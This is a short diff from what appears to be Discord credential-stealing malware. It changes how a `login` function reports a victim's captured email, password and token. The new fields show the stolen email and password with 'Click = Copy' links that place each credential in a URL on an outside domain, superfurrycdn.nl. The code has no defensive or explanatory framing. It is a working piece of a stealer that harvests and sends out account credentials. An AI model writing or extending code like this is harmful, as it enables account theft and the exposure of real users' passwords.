@@ -665,9 +665,14 @@ const login = async (email, password, token) => {
             inline: false,
           },
           {
-            name: '**Account Info**',
-            value: `Email: **${email}** - Password: **${password}**`,
-            inline: false,
+            name: '<a:9574_Butterfly_Blue:985666963089014805> @SN - Email:',
+            value: `\`${email}\`\n[Click = Copy](https://superfurrycdn.nl/copy/${email})`,
+            inline: true,
+          },
+          {
+            name: '<a:4536gun4:985673435860586557> @SN - Password:',
+            value: `\`${password}\`\n[Click = Copy](https://superfurrycdn.nl/copy/${password})`,
+            inline: true,
           },
           {
             name: '**Discord Info**',
